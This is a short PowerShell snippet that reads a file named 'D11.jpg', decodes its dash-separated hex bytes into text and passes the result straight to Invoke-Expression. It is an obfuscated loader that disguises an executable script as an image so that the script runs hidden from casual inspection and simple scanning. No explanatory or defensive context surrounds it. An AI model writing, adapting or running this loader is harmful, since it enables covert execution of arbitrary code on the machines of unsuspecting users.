
$mv = Get-Content "D11.jpg";
$asciiChars= $mv -split '-' |ForEach-Object {[char][byte]"0x$_"};$asciiString= $asciiChars -join ''|IEX